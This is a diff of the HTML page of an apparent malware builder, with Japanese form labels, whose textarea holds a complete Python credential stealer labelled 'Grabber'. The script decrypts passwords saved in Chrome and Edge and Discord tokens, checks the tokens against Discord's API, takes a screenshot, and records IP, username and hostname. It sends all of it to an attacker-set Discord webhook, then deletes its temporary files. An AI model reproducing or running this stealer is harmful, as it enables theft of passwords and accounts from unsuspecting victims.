@@ -37,84 +37,88 @@
                         </div>
                         <div class="mb-2">
                             <label for="libraries">使用ライブラリリスト（カンマ区切り）</label>
-                            <input type="text" class="form-control" id="libraries" name="libraries" value="requests,mss,Pillow,dpapi" required>
+                            <input type="text" class="form-control" id="libraries" name="libraries" value="requests,mss,Pillow,pycryptodome" required>
                         </div>
                         <div class="mb-2">
-                            <label for="script">Pythonスクリプト（変更は開発者向け）（WebhookURLの定数はWEBHOOK_URLです、定義はこのコードの前に来ます）:</label>
-                            <textarea class="form-control" id="script" name="script" rows="20">N='encrypted_key'
-M='os_crypt'
-J='loginData'
-F='utf-8'
-E=open
-K=WEBHOOK_URL
-import requests as D,getpass as O,sqlite3 as X,shutil as Y,socket as P,base64 as H,dpapi as L,json as I,mss,re,os as A
-from Crypto.Cipher import AES as C
-G=A.getenv('LOCALAPPDATA')
-B=A.getenv('APPDATA')
-Z=[f"{G}\\Google\\Chrome",f"{G}\\Microsoft\\Edge",f"{G}\\Google\\Chrome SxS"]
-R=[f"{B}\\discord",f"{B}\\discordcanary",f"{B}\\Lightcord",f"{B}\\discordptb"]
-V=''
-def S(token):
-    A=token
-    if not A:return False
-    C={'Content-Type':'application/json','Authorization':A};B=D.get('https://discord.com/api/v9/users/@me',headers=C);return str(B.status_code)[0]=='2',B.text
-def Q():
-    G={}
-    for O in R:
-        T=f"{O}\\Local State";J=f"{O}\\Local Storage\\leveldb"
-        if not A.path.exists(J):continue
-        with E(T,encoding=F)as U:V=I.load(U)
-        B=V[M][N];B=B.encode(F);B=H.b64decode(B)[5:];W=L.unprotect(B)
-        for D in A.listdir(J):
-            if not D.endswith(('.log','.ldb')):continue
-            with E(A.path.join(J,D),'r',errors='ignore')as D:
-                X=D.readlines()
-                for Y in X:
-                    for Z in re.findall('dQw4w9WgXcQ:[^"]*',Y):
+                            <label for="script">Pythonスクリプト（変更は開発者向け）（WebhookURLはpwu.datというファイルにシーザー暗号で保存します）:</label>
+                            <textarea class="form-control" id="script" name="script" rows="20">_D='encrypted_key'
+_C='os_crypt'
+_B='loginData'
+_A='utf-8'
+import requests,getpass,sqlite3,shutil,socket,base64,json,mss,re,os,Crypto,ctypes
+from ctypes import*
+from ctypes.wintypes import*
+from Crypto.Cipher import AES
+LOCAL=os.getenv('LOCALAPPDATA')
+ROAMING=os.getenv('APPDATA')
+CHROMIUM_DIRS=[f"{LOCAL}\\Google\\Chrome",f"{LOCAL}\\Microsoft\\Edge",f"{LOCAL}\\Google\\Chrome SxS"]
+DISCORD_DIRS=[f"{ROAMING}\\discord",f"{ROAMING}\\discordcanary",f"{ROAMING}\\Lightcord",f"{ROAMING}\\discordptb"]
+data=''
+class DATA_BLOB(ctypes.Structure):_fields_=[('cbData',DWORD),('pbData',LPBYTE)]
+def decryptData(encryptedData):
+    A=None;crypt32=ctypes.windll.crypt32;crypt32.CryptUnprotectData.restype=BOOL;crypt32.CryptUnprotectData.argtypes=[ctypes.POINTER(DATA_BLOB),ctypes.POINTER(ctypes.c_wchar_p),ctypes.POINTER(DATA_BLOB),LPVOID,LPVOID,DWORD,ctypes.POINTER(DATA_BLOB)];encryptedBlob=DATA_BLOB();encryptedBlob.cbData=len(encryptedData);buffer=ctypes.create_string_buffer(encryptedData);encryptedBlob.pbData=ctypes.cast(buffer,LPBYTE);decryptedBlob=DATA_BLOB();result=crypt32.CryptUnprotectData(ctypes.byref(encryptedBlob),A,A,A,A,0,ctypes.byref(decryptedBlob))
+    if result:decryptedData=ctypes.string_at(decryptedBlob.pbData,decryptedBlob.cbData);return decryptedData
+    else:error_code=ctypes.GetLastError();raise Exception(f"Data decryption failed with error code: {error_code}")
+def getUserInfo(token):
+    if not token:return False
+    headers={'Content-Type':'application/json','Authorization':token};res=requests.get('https://discord.com/api/v9/users/@me',headers=headers);return str(res.status_code)[0]=='2',res.text
+def findDiscordTokens():
+    tokens={}
+    for discord in DISCORD_DIRS:
+        localState=f"{discord}\\Local State";leveldb=f"{discord}\\Local Storage\\leveldb"
+        if not os.path.exists(leveldb):continue
+        with open(localState,encoding=_A)as f:d=json.load(f)
+        encryptedKey=d[_C][_D];encryptedKey=encryptedKey.encode(_A);encryptedKey=base64.b64decode(encryptedKey)[5:];secretKey=decryptData(encryptedKey)
+        for file in os.listdir(leveldb):
+            if not file.endswith(('.log','.ldb')):continue
+            with open(os.path.join(leveldb,file),'r',errors='ignore')as file:
+                lines=file.readlines()
+                for line in lines:
+                    for regexLine in re.findall('dQw4w9WgXcQ:[^"]*',line):
                         try:
-                            P=H.b64decode(Z.split('dQw4w9WgXcQ:')[1]);a=P[3:15];b=P[15:];c=C.new(W,C.MODE_GCM,a);K=c.decrypt(b)[:-16].decode();Q=S(K)
-                            if Q[0]:
-                                if K in G:continue
-                                G[K]=Q[1];break
-                        except Exception as d:continue
-    return G
-def T():
-    D='===== Find Chromium Datas =====\n'
-    for dir in Z:
-        O=f"{dir}\\User Data\\Local State"
-        if not A.path.exists(O):continue
-        D+='===== '+dir.split('\\')[-1]+' =====\n'
-        with E(O,encoding=F)as a:P=I.load(a)
-        Q=P['profile']['info_cache'];B=P[M][N];B=B.encode(F);B=H.b64decode(B)[5:];b=L.unprotect(B)
-        for K in Q:
-            R=Q[K];D+=K+':\n    Email:'+R['user_name']+'\n    Name:'+R['gaia_name']+'\n    LoginData:\n';c=f"{dir}\\User Data\\{K}\\Login Data";Y.copy2(c,J);S=X.connect(J);T=S.cursor();T.execute('SELECT action_url, username_value, password_value FROM logins')
-            for(g,G)in enumerate(T.fetchall()):
-                U=G[0];V=G[1];d=G[2][3:15];e=G[2][15:-16];f=C.new(b,C.MODE_GCM,d);W=f.decrypt(e).decode()
-                if U and V and W:D+=f"\n        ServiceUrl:{U}\n        Username:{V}\n        Password:{W}\n"
-            S.close()
-    return D
-def U():
-    M='file';G='screenshot.png';print('Start....');N=T();H=Q();R=D.get('https://ifconfig.me').text;S=O.getuser();U=P.gethostname();V={'left':0,'top':0,'width':1920,'height':1080}
-    with mss.mss()as W:B=W.grab(V);mss.tools.to_png(B.rgb,B.size,output=G)
-    B=E(G,'rb');F=f"""# Grabber Result
+                            x=base64.b64decode(regexLine.split('dQw4w9WgXcQ:')[1]);initialisationVector=x[3:15];encryptedToken=x[15:];cipher=AES.new(secretKey,AES.MODE_GCM,initialisationVector);token=cipher.decrypt(encryptedToken)[:-16].decode();userInfo=getUserInfo(token)
+                            if userInfo[0]:
+                                if token in tokens:continue
+                                tokens[token]=userInfo[1];break
+                        except Exception as e:continue
+    return tokens
+def findChromiumDatas():
+    resultStr='===== Find Chromium Datas =====\n'
+    for dir in CHROMIUM_DIRS:
+        localState=f"{dir}\\User Data\\Local State"
+        if not os.path.exists(localState):continue
+        resultStr+='===== '+dir.split('\\')[-1]+' =====\n'
+        with open(localState,encoding=_A)as f:d=json.load(f)
+        profiles=d['profile']['info_cache'];encryptedKey=d[_C][_D];encryptedKey=encryptedKey.encode(_A);encryptedKey=base64.b64decode(encryptedKey)[5:];secretKey=decryptData(encryptedKey)
+        for profileName in profiles:
+            profile=profiles[profileName];resultStr+=profileName+':\n    Email:'+profile['user_name']+'\n    Name:'+profile['gaia_name']+'\n    LoginData:\n';loginDataDb=f"{dir}\\User Data\\{profileName}\\Login Data";shutil.copy2(loginDataDb,_B);c=sqlite3.connect(_B);cu=c.cursor();cu.execute('SELECT action_url, username_value, password_value FROM logins')
+            for(i,l)in enumerate(cu.fetchall()):
+                url=l[0];username=l[1];initialisationVector=l[2][3:15];encryptedPassword=l[2][15:-16];cipher=AES.new(secretKey,AES.MODE_GCM,initialisationVector);password=cipher.decrypt(encryptedPassword).decode()
+                if url and username and password:resultStr+=f"\n        ServiceUrl:{url}\n        Username:{username}\n        Password:{password}\n"
+            c.close()
+    return resultStr
+def main():
+    B='file';A='screenshot.png';print('Start....');resultStr=findChromiumDatas();tokens=findDiscordTokens();ip=requests.get('https://ifconfig.me').text;useUser=getpass.getuser();hostName=socket.gethostname();monitor={'left':0,'top':0,'width':1920,'height':1080}
+    with mss.mss()as sct:screenshot=sct.grab(monitor);mss.tools.to_png(screenshot.rgb,screenshot.size,output=A)
+    screenshot=open(A,'rb');message=f"""# Grabber Result
 ```
-IP:{R}
-UseUser:{S}
-HostName:{U}```
+IP:{ip}
+UseUser:{useUser}
+HostName:{hostName}```
 ## Tokens
 ```
 """
-    for L in H:C=I.loads(H[L]);F+=f"""Token - {L}
-UserId - {C["id"]}
-UserName - {C["username"]}
-GlobalName - {C["global_name"]}
-Email - {C["email"]}
-PhoneNumber - {C["phone"]}
+    for token in tokens:userInfo=json.loads(tokens[token]);message+=f"""Token - {token}
+UserId - {userInfo["id"]}
+UserName - {userInfo["username"]}
+GlobalName - {userInfo["global_name"]}
+Email - {userInfo["email"]}
+PhoneNumber - {userInfo["phone"]}
 
 """
-    F+='```';D.post(K,data={'content':F},files={M:B});D.post(K,files={M:('loginData.txt',N.encode())});B.close();X=[J,G]
-    for Y in X:A.remove(Y)
-if __name__=='__main__':U()</textarea>
+    message+='```';requests.post(WEBHOOK_URL,data={'content':message},files={B:screenshot});requests.post(WEBHOOK_URL,files={B:('loginData.txt',resultStr.encode())});screenshot.close();files=[_B,A]
+    for file in files:os.remove(file)
+if __name__=='__main__':main()</textarea>
                         </div>
                         <button type="submit" id="submit" class="btn btn-primary">
                             <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
@@ -131,7 +135,7 @@ if __name__=='__main__':U()</textarea>
             var librariesInput = document.getElementById("libraries");
             var scriptInput = document.getElementById("script");
             var submitButton = document.getElementById("submit");
-            webhookUrlInput.readOnly = librariesInput.readOnly = scriptInput.readOnly = ngrokTokenInput.readOnly = true;
+            webhookUrlInput.readOnly = librariesInput.readOnly = scriptInput.readOnly = true;
             submitButton.disabled = true;
             var spinner = this.querySelector('.spinner-border');
             spinner.classList.remove('d-none');
